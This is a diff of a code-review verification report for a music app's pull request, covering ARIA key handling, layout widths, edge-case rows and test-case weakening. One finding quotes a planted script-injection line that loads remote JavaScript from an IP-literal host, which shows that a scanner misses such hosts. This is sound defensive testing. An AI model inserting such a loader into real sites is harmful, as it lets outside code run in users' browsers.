@@ -1,4 +1,30 @@
 VERDICT: FAIL
+P0 | CLASS=other | scripts/check-scroll-sync.ts:262 | Open, waiting on the owner. The line is restored byte for byte to its text before 5e0549b, so the case "there is no album or radio-edit choice" fails again on the pill's DECIDED `role="radio"`. QUESTIONS.md item 1 gives the owner three choices and a tested narrower line to name. This round does not bend the case again.
+Nits:
+P3 | CLASS=layout-width | src/styles.css:683 | Not changed. Folded under 430 px, the pill parts are unequal (46, 57 and 72 px), and from 430 to 539 px the text is 11 px. A layout change is not a small fix here. Left for the owner.
+P3 | CLASS=layout-width | src/styles.css:640 | Not changed. Folded at 360 px a long key reads "A (pra?". Same reason.
+
+# p2-view-pill fix round (PR 127 laptop verify at 4efb12d)
+
+Goal: each finding of the PR 127 laptop verify gets a case that fails on 4efb12d, then the smallest fix that makes the same case pass. Logs are in `.verify-logs/fix127/` (gitignored).
+
+- P0, check:scroll-sync. Repro: a "Pace" radiogroup with Full and Short planted in SongControls. With the loosened 4efb12d line the case passes, exit 0 (`p0-pace-loosened.log`). With the restored line it fails, exit 1 (`p0-pace-restored.log`). `git diff 5e0549b^ -- scripts/check-scroll-sync.ts` is empty. Without the plant, the restored line also fails on the pill itself (`after-scroll-sync.log`, 1 failed). That conflict between the brief and the case is QUESTIONS.md item 1.
+- P2, Up/Down. Cases first: V3 now presses ArrowDown and ArrowUp on Nashville and expects focus, choice and sheet to stay on Nashville. On 4efb12d V3 fails with "ArrowDown leaves focus on Nashville ("Chords only")" (`red-view-pill.log`). The fix maps keys in one table, `PILL_STEPS` (Left -1, Right +1), in `src/controls.tsx`, as brief item 4 says. Up and Down stay free for page-turn pedals. After the fix check:view-pill prints 16 of 16 ok, three runs in a row, exit 0 (`green-view-pill-1..3.log`). Mutation: adding `ArrowDown: 1` to the table turns only V3 red (`mutant-down.log`). QUESTIONS.md item 2 lets the owner choose the ARIA Up/Down instead.
+- P2, EDGE-CASES.md. `C:\Users\guard\cooks\EDGE-CASES.md` gains EC-18 to EC-22: a themed color transition, a content regex matching an ARIA role, a long label beside a `flex: none` control, a breakpoint that does not fit at its own width, and a key handler taking keys no case presses. `grep -c -i -E "pill|transition|radio|long key|430"` counted 0 before and 5 after (`red-edge-cases.log`, `green-edge-cases.log`). The file is in no git repo, so no commit holds the rows.
+- P3, full width under 430 px. V6 now asserts that at 360 and 390 px the pill's width equals the controls' content width within 1 px. It passes on 4efb12d too, because the layout was right and only the assertion was missing.
+- P3, mutation proof strength (V6 `white-space`, V11 fill). Not changed. Both mutations already turn a case red.
+- P3, check-ux-chords-only and check-ux-sheet-controls-save edits. Not changed. The verify judged neither a loosening. An owner may name them.
+- P3, missing cook report. This section and the logs above are the evidence for this round. The earlier Gemini rounds are not re-run here.
+
+Also run after the fix, all exit 0: `npm run build`, `check:portable`, `check:one-copy`. `check:scroll-sync` exits 1 on the one restored case and passes its other cases.
+
+# Independent verify of PR 127 at 4efb12d
+
+Its findings and notes are in the fix-round brief and in `C:\Users\guard\cooks\wt-verify-pr127\VERIFY.md`. The prior file follows verbatim.
+
+# Prior VERIFY.md at 4efb12d (kept verbatim below)
+
+VERDICT: FAIL
 P2 | CLASS=other | scripts/check-legal-audit.ts:282 | The fix round weakened its own red case instead of fixing the doc. At 8ef171c D1 required the cited row to contain the host `musicbrainz.org` (red.log:53). 384ecc9 changed the matcher to the bare word `musicbrainz`. LEGAL-TODO.md has 0 occurrences of `musicbrainz.org`, so the 8ef171c D1 still fails on head with "row 5 does not mention musicbrainz.org". The fix brief required "the same case passes". The brief says a wrong case goes to QUESTIONS.md, not a looser matcher.
 P2 | CLASS=other | scripts/check-legal-audit.ts:40 | The second prior P2 is only closed for DNS names. `ABSOLUTE_URL` needs a letter TLD (`\.[a-z]{2,}`), so a planted `dist/assets/i.js` with `s=document.createElement("script");s.src="https://203.0.113.5/x.js";document.head.append(s)` gives 0 findings (measured on a temp copy of the scanner). An injected script from an unlisted IP-literal host passes R2 and R2b, and LEGAL-TODO.md:15 still says the check "fails if any of those change".
 P2 | CLASS=other | C:\Users\guard\cooks\EDGE-CASES.md:- | The fix round added no EDGE-CASES.md row (REVIEW.md P2). The file was last written Nov 27 04:40, before 384ecc9 (12:21), and has no row for "a scanner keyed on file extension misses HTML built in a .ts file" or "protocol-relative URL". The repo has no EDGE-CASES.md.
